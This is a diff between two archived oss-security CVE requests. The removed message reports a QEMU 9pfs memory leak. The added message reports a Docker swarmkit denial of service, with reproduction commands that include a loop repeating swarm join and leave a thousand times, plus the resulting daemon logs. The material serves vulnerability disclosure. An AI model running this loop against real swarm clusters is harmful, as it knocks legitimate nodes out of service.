@@ -1,35 +1,86 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/27/15
-Message-ID: <alpine.LFD.2.20.1610280232200.6132@wniryva>
-Date: Fri, 28 Oct 2016 02:34:22 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-cc: Li Qiang <liqiang6-s@....cn>
-Subject: CVE request Qemu: 9pfs: memory leakage when creating extended attribute
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/29/3
+Message-ID: <5EDB84F4B23F5B4DB6500A89258280E0BD067A@EX02.corp.qihoo.net>
+Date: Fri, 29 Jul 2016 09:47:31 +0000
+From: 张开翔 <zhangkaixiang@....cn>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+CC: "cve-assign@...re.org" <cve-assign@...re.org>
+Subject: cve request: docker swarmkit Dos occurs by repeatly joining and quitting swam cluster as a node
 Content-Type: text/plain; charset=utf-8
 
-   Hello,
+Docker swarmkit is used to form a swarm, coordinating tasks. Once a machine joins, it becomes a Swarm Node. Nodes can either be worker nodes or manager nodes.
+ I found a vulnerability in docker of the latest version which could cause a Denial of Service, it results in a machine could not join the swarm cluster after another node’s repeatedly
+joining and quitting the swarm for many times(taking my testing as example , it should need at least one thousand times. )Moreover, the docker debugging info indicates
+the Dispatcher is stopped and ca server may exited sometimes.
 
-Quick Emulator(Qemu) built with the VirtFS, host directory sharing via Plan 9 
-File System(9pfs) support, is vulnerable to memory leakage issue. It could 
-occur while creating extended attribute via 'Txattrcreate' message.
 
-A privileged user inside guest could use this flaw to leak host memory, thus 
-affecting other services on the host and/or potentially crash the Qemu process 
-on the host.
+# docker version
+Client:
+Version:      1.12.0-dev
+API version:  1.25
+Go version:   go1.6.3
+Git commit:   9c1be54-unsupported
+Built:        Fri Jul 29 15:40:52 2016
+OS/Arch:      linux/amd64
 
-Upstream patches:
------------------
-   -> https://lists.gnu.org/archive/html/qemu-devel/2016-10/msg01861.html
+Server:
+Version:      1.12.0-dev
+API version:  1.25
+Go version:   go1.6.3
+Git commit:   9c1be54-unsupported
+Built:        Fri Jul 29 15:40:52 2016
+OS/Arch:      linux/amd64
 
-Reference:
-----------
-   -> http://wiki.qemu.org/Documentation/9psetup
-   -> https://bugzilla.redhat.com/show_bug.cgi?id=1389550
+# docker swarm init
+Swarm initialized: current node (23m6ksr96whsvuo8lzokenju3) is now a manager.
 
-This issue was reported by Li Qiang of 360.cn Inc.
+To add a worker to this swarm, run the following command:
+    docker swarm join \
+    --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-aljewtdn5727g1pldxnevjh51 \
+    xx.xx.xx.xx:2377
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+To add a manager to this swarm, run the following command:
+    docker swarm join \
+    --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-0p086z2sdbnpvognjmu76gpi6 \
+    xx.xx.xx.xx :2377
+
+Login machine A1 and join the swarm ,and then quitted the swarm.
+-----------------------------------------------------
+# docker swarm join --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-aljewtdn5727g1pldxnevjh51 xx.xx.xx.xx:2377
+This node joined a swarm as a worker.
+# docker swarm leave --force
+Node left the swarm.
+
+Login machine A2 , repeatedly join and quit the swarm for 1000 times.
+-----------------------------------------------------
+# for i in {1..1000}; do docker swarm leave --force ; docker swarm join --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-aljewtdn5727g1pldxnevjh51 xx.xx.xx.xx:2377 ;done
+This node joined a swarm as a worker.
+Node left the swarm.
+This node joined a swarm as a worker.
+Node left the swarm.
+This node joined a swarm as a worker.
+Node left the swarm.
+This node joined a swarm as a worker.
+Node left the swarm.
+This node joined a swarm as a worker.
+Node left the swarm.
+
+After finishing that, Login machine A1 again and attempt to join the swarm, it failed.
+--------------------------------------------------------
+# docker swarm join --token SWMTKN-1-30f6ibzpscqh05qqdog85ktr8ptcw7ttn4wy5cwixy1wfchhb9-aljewtdn5727g1pldxnevjh51 xx.xx.xx.xx:2377
+Error response from daemon: Timeout was reached before node was joined. Attempt to join the cluster will continue in the background. Use "docker info" command to see the current swarm status of your node.
+
+  Some debugging information of docker daemon.
+  ---------------------------------------------------------
+time="2016-07-29T15:24:02.374560815+08:00" level=error msg="failed to remove node" error="rpc error: code = 10 desc = dispatcher is stopped" method="(*Dispatcher).Session" node.id=b11ta5p8g2wgy10vyzgsi6ocm node.session=1aph8scsewn89j3h5o3emgdql
+time="2016-07-29T15:24:02.374604898+08:00" level=error msg=" session failed" error="rpc error: code = 1 desc = context canceled" module=agent
+         time="2016-07-29T15:24:14.069347074+08:00" level=debug msg="heartbeat expiration"
+time="2016-07-29T15:24:14.069428834+08:00" level=error msg="failed deregistering node after heartbeat expiration" error="rpc error: code = 10 desc = dispatcher is stopped"
+… …
+
+Please assign CVE IDs for the security issue ?
+
+  Best regards&
+  Kaixiang Zhang of the Cloud Security Team, Qihoo 360
+
+
